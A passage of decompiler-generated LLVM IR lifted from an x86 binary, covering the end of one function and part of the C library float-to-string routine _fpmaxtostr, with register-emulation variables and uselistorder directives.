dec_label_pc_804e358:                             ; preds = %dec_label_pc_804e341
  %v4_804e358 = icmp eq i32 %stack_var_-28.0, 0
  br i1 %v4_804e358, label %dec_label_pc_804e363, label %dec_label_pc_804e35f

dec_label_pc_804e35f:                             ; preds = %dec_label_pc_804e358
  %v0_804e35f = load i32, i32* %edi.global-to-local, align 4
  %v1_804e35f = add i32 %v0_804e35f, -1
  store i32 %v1_804e35f, i32* %edi.global-to-local, align 4
  %v1_804e360 = inttoptr i32 %v1_804e35f to i8*
  store i8 45, i8* %v1_804e360, align 1
  br label %dec_label_pc_804e363

dec_label_pc_804e363:                             ; preds = %dec_label_pc_804e358, %dec_label_pc_804e35f
  %v0_804e366 = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_804e366

; uselistorder directives
  uselistorder i32 %v2_804e321, { 1, 0 }
  uselistorder i32 %v0_804e30a, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_804e306, { 1, 0, 2 }
  uselistorder i32 %v0_804e339, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804e2db, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i8 45, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e363, { 1, 0 }
  uselistorder label %dec_label_pc_804e341, { 1, 0 }
  uselistorder label %dec_label_pc_804e2fa, { 1, 0 }
  uselistorder label %dec_label_pc_804e2d6, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp103 = call i16 @__decompiler_undefined_function_1()
  %tmp112 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e371 = load i32, i32* @edi, align 4
  %v0_804e372 = load i32, i32* @esi, align 4
  %v0_804e373 = load i32, i32* @ebx, align 4
  store i32 %v0_804e373, i32* %stack_var_-16, align 4
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v4_804e388 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_804e388 = add i3 %v4_804e388, -1
  store i3 %v5_804e388, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_804e38f = add i32 %tmp112, 4
  %v2_804e38f = inttoptr i32 %v1_804e38f to i32*
  %v3_804e38f = load i32, i32* %v2_804e38f, align 4
  store i32 %v3_804e38f, i32* %eax.global-to-local, align 4
  %v1_804e396 = add i32 %tmp112, 8
  %v2_804e396 = inttoptr i32 %v1_804e396 to i8*
  %v3_804e396 = load i8, i8* %v2_804e396, align 1
  %v4_804e396 = zext i8 %v3_804e396 to i32
  %v5_804e396 = load i32, i32* @ecx, align 4
  %v6_804e396 = and i32 %v5_804e396, -256
  %v7_804e396 = or i32 %v6_804e396, %v4_804e396
  store i32 %v7_804e396, i32* %ecx.global-to-local, align 4
  %v1_804e399 = inttoptr i32 %tmp112 to i32*
  %v2_804e399 = load i32, i32* %v1_804e399, align 4
  store i32 %v2_804e399, i32* %ebp.global-to-local, align 4
  %v3_804e39b = and i32 %v3_804e38f, -256
  %v4_804e39b = or i32 %v3_804e39b, %v4_804e396
  %v1_804e3a1 = or i32 %v4_804e39b, 32
  %v3_804e3a1 = trunc i32 %v1_804e3a1 to i8
  store i32 %v1_804e3a1, i32* %eax.global-to-local, align 4
  %v10_804e3ac = icmp eq i8 %v3_804e3a1, 97
  %v1_804e3ae = icmp eq i1 %v10_804e3ac, false
  br i1 %v1_804e3ae, label %dec_label_pc_804e3b7, label %dec_label_pc_804e3b0

dec_label_pc_804e3b0:                             ; preds = %entry
  %v1_804e3b0 = add i32 %v7_804e396, 6
  %v11_804e3b0 = trunc i32 %v1_804e3b0 to i8
  store i32 %v1_804e3b0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e3b7

dec_label_pc_804e3b7:                             ; preds = %entry, %dec_label_pc_804e3b0
  %stack_var_-206.0 = phi i8 [ %v3_804e396, %entry ], [ %v11_804e3b0, %dec_label_pc_804e3b0 ]
  %v2_804e3b7 = icmp slt i32 %v2_804e399, 0
  %v1_804e3b9 = icmp eq i1 %v2_804e3b7, false
  br i1 %v1_804e3b9, label %dec_label_pc_804e3c0, label %dec_label_pc_804e3bb

dec_label_pc_804e3bb:                             ; preds = %dec_label_pc_804e3b7
  store i32 6, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804e3c0

dec_label_pc_804e3c0:                             ; preds = %dec_label_pc_804e3b7, %dec_label_pc_804e3bb
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_804e3cf = add i32 %tmp112, 12
  %v2_804e3cf = inttoptr i32 %v1_804e3cf to i32*
  %v3_804e3cf = load i32, i32* %v2_804e3cf, align 4
  store i32 %v3_804e3cf, i32* %eax.global-to-local, align 4
  %v2_804e3d2 = and i32 %v3_804e3cf, 2
  %v3_804e3d2 = icmp eq i32 %v2_804e3d2, 0
  br i1 %v3_804e3d2, label %dec_label_pc_804e3e0, label %dec_label_pc_804e3ec

dec_label_pc_804e3e0:                             ; preds = %dec_label_pc_804e3c0
  %v2_804e3e0 = urem i32 %v3_804e3cf, 2
  %tmp143 = trunc i32 %v2_804e3e0 to i8
  %tmp = sub nsw i8 0, %tmp143
  %tmp144 = and i8 %tmp, 32
  br label %dec_label_pc_804e3ec

dec_label_pc_804e3ec:                             ; preds = %dec_label_pc_804e3e0, %dec_label_pc_804e3c0
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_804e3c0 ], [ %tmp144, %dec_label_pc_804e3e0 ]
  %v1_804e400 = udiv i32 %v3_804e3cf, 256
  %tmp146 = and i32 %v1_804e400, 68
  %tmp147 = icmp eq i32 %tmp146, 64
  br i1 %tmp147, label %dec_label_pc_804e552, label %dec_label_pc_804e472

dec_label_pc_804e472:                             ; preds = %dec_label_pc_804e3ec
  store i3 %v4_804e388, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_804e479 = add i32 %tmp112, 16
  %v2_804e479 = inttoptr i32 %v1_804e479 to i32*
  store i32 32, i32* %v2_804e479, align 4
  store i32 3, i32* %stack_var_-152, align 4
  %v4_804e490 = add i8 %stack_var_-206.0, -96
  %v6_804e490 = sub i8 95, %stack_var_-206.0
  %v7_804e490 = and i8 %v6_804e490, %stack_var_-206.0
  %v8_804e490 = icmp slt i8 %v7_804e490, 0
  %v9_804e490 = icmp eq i8 %v4_804e490, 0
  %v10_804e490 = icmp slt i8 %v4_804e490, 0
  %v3_804e495 = icmp eq i1 %v10_804e490, %v8_804e490
  %v4_804e495 = icmp eq i1 %v9_804e490, false
  %v5_804e495 = and i1 %v4_804e495, %v3_804e495
  br i1 %v5_804e495, label %dec_label_pc_804e49c, label %dec_label_pc_804e497

dec_label_pc_804e497:                             ; preds = %dec_label_pc_804e472
  br label %dec_label_pc_804e49c

dec_label_pc_804e49c:                             ; preds = %dec_label_pc_804e472, %dec_label_pc_804e497
  %v2_804e4a4 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804e4a4, i32* @ecx, align 4
  br label %dec_label_pc_804e877

dec_label_pc_804e552:                             ; preds = %dec_label_pc_804e3ec
  %v1_804e411 = add i3 %v4_804e388, -2
  store x86_fp80 0xK3FFF8000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v6_804e556 = and i32 %v3_804e3cf, -65536
  %v2_804e55b = ptrtoint i32* %stack_var_-70 to i32
  store i32 %v2_804e55b, i32* %edx.global-to-local, align 4
  %v1_804e562 = udiv i16 %tmp103, 256
  %v2_804e562 = zext i16 %v1_804e562 to i32
  %v3_804e562 = mul nuw nsw i32 %v2_804e562, 256
  %tmp148 = urem i16 %tmp103, 256
  %v4_804e556.masked = zext i16 %tmp148 to i32
  %v11_804e562 = or i32 %v4_804e556.masked, %v3_804e562
  %v10_804e562 = or i32 %v11_804e562, %v6_804e556
  %v12_804e562 = or i32 %v10_804e562, 3072
  store i32 %v12_804e562, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_804e411, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_804e576

dec_label_pc_804e576:                             ; preds = %dec_label_pc_804e5c7.dec_label_pc_804e576_crit_edge, %dec_label_pc_804e552
  %v2_804e593 = phi x86_fp80 [ 0xK3FFF8000000000000000, %dec_label_pc_804e552 ], [ %v2_804e593.pre, %dec_label_pc_804e5c7.dec_label_pc_804e576_crit_edge ]
  %v1_804e576 = phi i3 [ %v1_804e411, %dec_label_pc_804e552 ], [ %v1_804e576.pre, %dec_label_pc_804e5c7.dec_label_pc_804e576_crit_edge ]
  %v3_804e59d = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_804e552 ], [ %v0_804e576.pre, %dec_label_pc_804e5c7.dec_label_pc_804e576_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_804e55b, %dec_label_pc_804e552 ], [ %v4_804e598, %dec_label_pc_804e5c7.dec_label_pc_804e576_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp149 = fptosi x86_fp80 %v3_804e59d to i32
  store i32 %tmp149, i32* %eax.global-to-local, align 4
  store i32 %tmp149, i32* %ebx.global-to-local, align 4
  %v5_804e590 = sitofp i32 %tmp149 to x86_fp80
  %v4_804e593 = fsub x86_fp80 %v2_804e593, %v5_804e590
  store i3 %v1_804e576, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_804e598 = add i32 %stack_var_-212.0, 9
  %v4_804e59d = fmul x86_fp80 %v3_804e59d, %v4_804e593
  store x86_fp80 %v4_804e59d, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_804e59f

dec_label_pc_804e59f:                             ; preds = %dec_label_pc_804e59f.dec_label_pc_804e59f_crit_edge, %dec_label_pc_804e576
  %v0_804e5b1 = phi i32 [ %v0_804e5b1.pre, %dec_label_pc_804e59f.dec_label_pc_804e59f_crit_edge ], [ %tmp149, %dec_label_pc_804e576 ]
  %v0_804e59f = phi i32 [ %v0_804e59f.pre, %dec_label_pc_804e59f.dec_label_pc_804e59f_crit_edge ], [ 0, %dec_label_pc_804e576 ]
  %v1_804e59f = add i32 %v0_804e59f, 1
  store i32 %v1_804e59f, i32* %esi.global-to-local, align 4
  %v2_804e5a4 = sub i32 %v4_804e598, %v1_804e59f
  store i32 10, i32* %ecx.global-to-local, align 4
  %div = udiv i32 %v0_804e5b1, 10
  %tmp136 = urem i32 %v0_804e5b1, 10
  store i32 %div, i32* %ebx.global-to-local, align 4
  store i32 %v2_804e5a4, i32* %eax.global-to-local, align 4
  %v1_804e5bd = or i32 %tmp136, 48
  %v8_804e5bd = trunc i32 %v1_804e5bd to i8
  store i32 %v1_804e5bd, i32* %edx.global-to-local, align 4
  %v3_804e5c3 = inttoptr i32 %v2_804e5a4 to i8*
  store i8 %v8_804e5bd, i8* %v3_804e5c3, align 1
  %v7_804e5c5 = icmp sgt i32 %v1_804e59f, 8
  br i1 %v7_804e5c5, label %dec_label_pc_804e5c7, label %dec_label_pc_804e59f.dec_label_pc_804e59f_crit_edge

dec_label_pc_804e59f.dec_label_pc_804e59f_crit_edge: ; preds = %dec_label_pc_804e59f
  %v0_804e59f.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_804e5b1.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e59f

dec_label_pc_804e5c7:                             ; preds = %dec_label_pc_804e59f
  %v0_804e5c7 = load i32, i32* @edi, align 4
  %v1_804e5c7 = add i32 %v0_804e5c7, 1
  store i32 %v1_804e5c7, i32* @edi, align 4
  %v7_804e5cb = icmp sgt i32 %v1_804e5c7, 2
  br i1 %v7_804e5cb, label %dec_label_pc_804e5cd, label %dec_label_pc_804e5c7.dec_label_pc_804e576_crit_edge

dec_label_pc_804e5c7.dec_label_pc_804e576_crit_edge: ; preds = %dec_label_pc_804e5c7
  %v0_804e576.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_804e576.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_804e593.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_804e576

dec_label_pc_804e5cd:                             ; preds = %dec_label_pc_804e5c7
  %v0_804e5cd = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_804e5cd = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_804e5cd, x86_fp80* %st0.global-to-local, align 4
  %v2_804e5cf = add i3 %v0_804e5cd, 2
  store i3 %v2_804e5cf, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_804e5d1 = add i8 %stack_var_-206.0, -96
  %v6_804e5d1 = sub i8 95, %stack_var_-206.0
  %v7_804e5d1 = and i8 %v6_804e5d1, %stack_var_-206.0
  %v8_804e5d1 = icmp slt i8 %v7_804e5d1, 0
  %v9_804e5d1 = icmp eq i8 %v4_804e5d1, 0
  %v10_804e5d1 = icmp slt i8 %v4_804e5d1, 0
  %v3_804e5d6 = icmp eq i1 %v10_804e5d1, %v8_804e5d1
  %v4_804e5d6 = icmp eq i1 %v9_804e5d1, false
  %v5_804e5d6 = and i1 %v4_804e5d6, %v3_804e5d6
  br i1 %v5_804e5d6, label %dec_label_pc_804e5e5, label %dec_label_pc_804e5d8

dec_label_pc_804e5d8:                             ; preds = %dec_label_pc_804e5cd
  %v4_804e5d8 = add i8 %stack_var_-206.0, 32
  br label %dec_label_pc_804e5e5

dec_label_pc_804e5e5:                             ; preds = %dec_label_pc_804e5cd, %dec_label_pc_804e5d8
  %stack_var_-206.1 = phi i8 [ %stack_var_-206.0, %dec_label_pc_804e5cd ], [ %v4_804e5d8, %dec_label_pc_804e5d8 ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_804e5cd ], [ 69, %dec_label_pc_804e5d8 ]
  %v12_804e5e5 = icmp eq i8 %stack_var_-206.1, 103
  %v1_804e5ea = icmp eq i1 %v12_804e5e5, false
  br i1 %v1_804e5ea, label %dec_label_pc_804e5f3, label %dec_label_pc_804e5ec

dec_label_pc_804e5ec:                             ; preds = %dec_label_pc_804e5e5
  %v0_804e5ec = load i32, i32* %ebp.global-to-local, align 4
  %tmp137 = icmp slt i32 %v0_804e5ec, 1
  br i1 %tmp137, label %dec_label_pc_804e5fa, label %dec_label_pc_804e5f0

dec_label_pc_804e5f0:                             ; preds = %dec_label_pc_804e5ec
  %v1_804e5f0 = add i32 %v0_804e5ec, -1
  store i32 %v1_804e5f0, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804e5fa

dec_label_pc_804e5f3:                             ; preds = %dec_label_pc_804e5e5
  %v12_804e5f3 = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v12_804e5f3, label %dec_label_pc_804e5fe, label %dec_label_pc_804e5f3.dec_label_pc_804e5fa_crit_edge

dec_label_pc_804e5f3.dec_label_pc_804e5fa_crit_edge: ; preds = %dec_label_pc_804e5f3
  %v0_804e5fa.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804e5fa

dec_label_pc_804e5fa:                             ; preds = %dec_label_pc_804e5f3.dec_label_pc_804e5fa_crit_edge, %dec_label_pc_804e5ec, %dec_label_pc_804e5f0
  %v0_804e5fa = phi i32 [ %v0_804e5fa.pre, %dec_label_pc_804e5f3.dec_label_pc_804e5fa_crit_edge ], [ %v0_804e5ec, %dec_label_pc_804e5ec ], [ %v1_804e5f0, %dec_label_pc_804e5f0 ]
  store i32 %v0_804e5fa, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e62b

dec_label_pc_804e5fe:                             ; preds = %dec_label_pc_804e5f3
  store i32 -1, i32* %edx.global-to-local, align 4
  %v0_804e602 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804e602 = add i32 %v0_804e602, -1
  store i32 %v2_804e602, i32* %ebx.global-to-local, align 4
  %v5_804e609 = icmp slt i32 %v2_804e602, -1
  br i1 %v5_804e609, label %dec_label_pc_804e60b, label %dec_label_pc_804e62b

dec_label_pc_804e60b:                             ; preds = %dec_label_pc_804e5fe
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804e613 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_804e613, i32* %eax.global-to-local, align 4
  %v4_804e61b = bitcast i32* %stack_var_-72 to i8*
  %v5_804e61b = call i32 @__GI_memset(i8* %v4_804e61b, i32 48, i32 21)
  store i32 %v5_804e61b, i32* %eax.global-to-local, align 4
  %v0_804e63b.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e62b

dec_label_pc_804e62b:                             ; preds = %dec_label_pc_804e5fe, %dec_label_pc_804e60b, %dec_label_pc_804e5fa
  %v1_804e64b = phi i32 [ %v0_804e5fa, %dec_label_pc_804e5fa ], [ %v0_804e63b.pr.pre, %dec_label_pc_804e60b ], [ %v2_804e602, %dec_label_pc_804e5fe ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_804e63e = icmp sgt i32 %v1_804e64b, 20
  br i1 %v7_804e63e, label %dec_label_pc_804e640, label %dec_label_pc_804e64b

dec_label_pc_804e640:                             ; preds = %dec_label_pc_804e62b
  %v2_804e640 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_804e640, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e65f.preheader

dec_label_pc_804e64b:                             ; preds = %dec_label_pc_804e62b
  %v0_804e64b = load i32, i32* @esp, align 4
  %v2_804e64b = add i32 %v1_804e64b, 165
  %v3_804e64b = add i32 %v2_804e64b, %v0_804e64b
  store i32 %v3_804e64b, i32* %eax.global-to-local, align 4
  %v1_804e652 = add i32 %v3_804e64b, 2
  store i32 %v1_804e652, i32* %ecx.global-to-local, align 4
  %v2_804e655 = inttoptr i32 %v1_804e652 to i8*
  %v3_804e655 = load i8, i8* %v2_804e655, align 1
  %v4_804e655 = add i8 %v3_804e655, -53
  %v9_804e655 = sub i8 52, %v3_804e655
  %v10_804e655 = and i8 %v9_804e655, %v3_804e655
  %v11_804e655 = icmp slt i8 %v10_804e655, 0
  %v13_804e655 = icmp slt i8 %v4_804e655, 0
  %v2_804e659 = icmp eq i1 %v13_804e655, %v11_804e655
  %v3_804e659 = zext i1 %v2_804e659 to i32
  br label %dec_label_pc_804e65f.preheader

dec_label_pc_804e65f.preheader:                   ; preds = %dec_label_pc_804e64b, %dec_label_pc_804e640
  %v0_804e65f63 = phi i32 [ %v1_804e652, %dec_label_pc_804e64b ], [ %v2_804e640, %dec_label_pc_804e640 ]
  %storemerge52 = phi i32 [ %v3_804e659, %dec_label_pc_804e64b ], [ 0, %dec_label_pc_804e640 ]
  store i32 %storemerge52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e65f

dec_label_pc_804e65f:                             ; preds = %dec_label_pc_804e65f.backedge, %dec_label_pc_804e65f.preheader
  %v3_804e660 = phi i32 [ %v3_804e660.pre, %dec_label_pc_804e65f.backedge ], [ %storemerge52, %dec_label_pc_804e65f.preheader ]
  %v0_804e65f = phi i32 [ %v0_804e662, %dec_label_pc_804e65f.backedge ], [ %v0_804e65f63, %dec_label_pc_804e65f.preheader ]
  %v1_804e65f = add i32 %v0_804e65f, -1
  store i32 %v1_804e65f, i32* %ecx.global-to-local, align 4
  %v1_804e660 = inttoptr i32 %v1_804e65f to i8*
  %v2_804e660 = load i8, i8* %v1_804e660, align 1
  %v4_804e660 = trunc i32 %v3_804e660 to i8
  %v5_804e660 = add i8 %v2_804e660, %v4_804e660
  store i8 %v5_804e660, i8* %v1_804e660, align 1
  %v0_804e662 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e662 = inttoptr i32 %v0_804e662 to i8*
  %v2_804e662 = load i8, i8* %v1_804e662, align 1
  %v3_804e662 = zext i8 %v2_804e662 to i32
  %v4_804e662 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e662 = and i32 %v4_804e662, -256
  %v6_804e662 = or i32 %v5_804e662, %v3_804e662
  store i32 %v6_804e662, i32* %edx.global-to-local, align 4
  %v7_804e664 = icmp eq i8 %v2_804e662, 48
  br i1 %v7_804e664, label %dec_label_pc_804e65f.backedge, label %dec_label_pc_804e669

dec_label_pc_804e65f.backedge:                    ; preds = %dec_label_pc_804e65f, %dec_label_pc_804e669
  %v3_804e660.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e65f

dec_label_pc_804e669:                             ; preds = %dec_label_pc_804e65f
  %v2_804e669 = add i8 %v2_804e662, -57
  %v7_804e669 = sub i8 56, %v2_804e662
  %v8_804e669 = and i8 %v7_804e669, %v2_804e662
  %v9_804e669 = icmp slt i8 %v8_804e669, 0
  %v10_804e669 = icmp eq i8 %v2_804e669, 0
  %v11_804e669 = icmp slt i8 %v2_804e669, 0
  %v3_804e66c = icmp eq i1 %v11_804e669, %v9_804e669
  %v4_804e66c = icmp eq i1 %v10_804e669, false
  %v5_804e66c = and i1 %v4_804e66c, %v3_804e66c
  br i1 %v5_804e66c, label %dec_label_pc_804e65f.backedge, label %dec_label_pc_804e66e

dec_label_pc_804e66e:                             ; preds = %dec_label_pc_804e669
  %v2_804e66e = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_804e66e, i32* %eax.global-to-local, align 4
  %tmp145 = icmp ugt i32 %v0_804e662, %v2_804e66e
  store i32 -1, i32* %esi.global-to-local, align 4
  br i1 %tmp145, label %dec_label_pc_804e679, label %dec_label_pc_804e686

dec_label_pc_804e679:                             ; preds = %dec_label_pc_804e66e
  store i32 %v2_804e55b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e68f

dec_label_pc_804e686:                             ; preds = %dec_label_pc_804e66e
  store i32 %v2_804e66e, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v2_804e66e, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e68f

dec_label_pc_804e68f:                             ; preds = %dec_label_pc_804e679, %dec_label_pc_804e686
  %v0_804e68f = phi i32 [ %v0_804e662, %dec_label_pc_804e679 ], [ %v2_804e66e, %dec_label_pc_804e686 ]
  %v1_804e68f = add i32 %v0_804e68f, 1
  store i32 %v1_804e68f, i32* %eax.global-to-local, align 4
  %v2_804e696 = inttoptr i32 %v1_804e68f to i8*
  store i8 0, i8* %v2_804e696, align 1
  br i1 %v1_804e5ea, label %dec_label_pc_804e6bc, label %dec_label_pc_804e6a1

dec_label_pc_804e6a1:                             ; preds = %dec_label_pc_804e68f
  %v0_804e6a1 = load i32, i32* %esi.global-to-local, align 4
  %v5_804e6a4 = icmp slt i32 %v0_804e6a1, -4
  br i1 %v5_804e6a4, label %dec_label_pc_804e6c9, label %dec_label_pc_804e6a6

dec_label_pc_804e6a6:                             ; preds = %dec_label_pc_804e6a1
  %v1_804e6a6 = load i32, i32* %ebx.global-to-local, align 4
  %v7_804e6a8 = icmp slt i32 %v1_804e6a6, %v0_804e6a1
  br i1 %v7_804e6a8, label %dec_label_pc_804e6c9, label %dec_label_pc_804e6b1

dec_label_pc_804e6b1:                             ; preds = %dec_label_pc_804e6a6
  %v2_804e6b8 = sub i32 %v1_804e6a6, %v0_804e6a1
  store i32 %v2_804e6b8, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804e6cd

dec_label_pc_804e6bc:                             ; preds = %dec_label_pc_804e68f
  %v4_804e6bc = zext i8 %stack_var_-206.1 to i32
  %v5_804e6bc = load i32, i32* %ecx.global-to-local, align 4
  %v6_804e6bc = and i32 %v5_804e6bc, -256
  %v7_804e6bc = or i32 %v6_804e6bc, %v4_804e6bc
  store i32 %v7_804e6bc, i32* %ecx.global-to-local, align 4
  %v10_804e6c4 = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v10_804e6c4, label %dec_label_pc_804e6bc.dec_label_pc_804e6cd_crit_edge, label %dec_label_pc_804e6c9

dec_label_pc_804e6bc.dec_label_pc_804e6cd_crit_edge: ; preds = %dec_label_pc_804e6bc
  %v0_804e6cd.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e6cd

dec_label_pc_804e6c9:                             ; preds = %dec_label_pc_804e6a1, %dec_label_pc_804e6a6, %dec_label_pc_804e6bc
  %stack_var_-197.0 = phi i8 [ %stack_var_-206.1, %dec_label_pc_804e6bc ], [ 103, %dec_label_pc_804e6a6 ], [ 103, %dec_label_pc_804e6a1 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e6d7

dec_label_pc_804e6cd:                             ; preds = %dec_label_pc_804e6bc.dec_label_pc_804e6cd_crit_edge, %dec_label_pc_804e6b1
  %v0_804e6cd = phi i32 [ %v0_804e6cd.pre, %dec_label_pc_804e6bc.dec_label_pc_804e6cd_crit_edge ], [ %v0_804e6a1, %dec_label_pc_804e6b1 ]
  store i32 %v0_804e6cd, i32* %ebx.global-to-local, align 4
  %v2_804e6cf = icmp slt i32 %v0_804e6cd, 0
  %v1_804e6d1 = icmp eq i1 %v2_804e6cf, false
  br i1 %v1_804e6d1, label %dec_label_pc_804e6d7, label %dec_label_pc_804e6d3

dec_label_pc_804e6d3:                             ; preds = %dec_label_pc_804e6cd
  %v0_804e6d3 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e6d3 = add i32 %v0_804e6d3, -1
  store i32 %v1_804e6d3, i32* %edx.global-to-local, align 4
  %v1_804e6d4 = inttoptr i32 %v1_804e6d3 to i8*
  store i8 48, i8* %v1_804e6d4, align 1
  %v0_804e70c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e6d7

dec_label_pc_804e6d7:                             ; preds = %dec_label_pc_804e6cd, %dec_label_pc_804e6c9, %dec_label_pc_804e6d3
  %v1_804e767 = phi i32 [ %v0_804e6cd, %dec_label_pc_804e6cd ], [ %v0_804e70c.pre, %dec_label_pc_804e6d3 ], [ 0, %dec_label_pc_804e6c9 ]
  %stack_var_-197.2 = phi i8 [ 102, %dec_label_pc_804e6cd ], [ 102, %dec_label_pc_804e6d3 ], [ %stack_var_-197.0, %dec_label_pc_804e6c9 ]
  %v2_804e6d7 = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_804e6d7, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v0_804e6f2 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e6f2 = inttoptr i32 %v0_804e6f2 to i8*
  %v2_804e6f2 = load i8, i8* %v1_804e6f2, align 1
  %v3_804e6f2 = zext i8 %v2_804e6f2 to i32
  %v5_804e6f2 = and i32 %v2_804e6d7, -256
  %v6_804e6f2 = or i32 %v3_804e6f2, %v5_804e6f2
  store i32 %v6_804e6f2, i32* %eax.global-to-local, align 4
  %v1_804e6f4 = add i32 %v0_804e6f2, 1
  store i32 %v1_804e6f4, i32* %edi.global-to-local, align 4
  store i32 %v6_804e6f2, i32* %stack_var_-22, align 4
  %v2_804e702 = sub i32 %v1_804e68f, %v1_804e6f4
  store i32 %v2_804e702, i32* %edx.global-to-local, align 4
  %v1_804e70c = icmp eq i32 %v1_804e767, 0
  %v2_804e70c = icmp slt i32 %v1_804e767, 0
  br i1 %v2_804e70c, label %dec_label_pc_804e75b, label %dec_label_pc_804e710

dec_label_pc_804e710:                             ; preds = %dec_label_pc_804e6d7
  store i32 112, i32* %stack_var_-144, align 4
  %v2_804e71c = sub i32 %v1_804e767, %v2_804e702
  %v8_804e71c = xor i32 %v2_804e702, %v1_804e767
  %v9_804e71c = xor i32 %v2_804e71c, %v1_804e767
  %v10_804e71c = and i32 %v9_804e71c, %v8_804e71c
  %v11_804e71c = icmp slt i32 %v10_804e71c, 0
  %v13_804e71c = icmp slt i32 %v2_804e71c, 0
  %v2_804e71e = icmp eq i1 %v13_804e71c, %v11_804e71c
  br i1 %v2_804e71e, label %dec_label_pc_804e720, label %dec_label_pc_804e754

dec_label_pc_804e720:                             ; preds = %dec_label_pc_804e710
  store i32 %v2_804e71c, i32* %eax.global-to-local, align 4
  %tmp138 = icmp slt i32 %v2_804e71c, 1
  %tmp139 = icmp eq i1 %tmp138, false
  br i1 %tmp139, label %dec_label_pc_804e735, label %dec_label_pc_804e750

dec_label_pc_804e735:                             ; preds = %dec_label_pc_804e720
  store i32 176, i32* %stack_var_-132, align 4
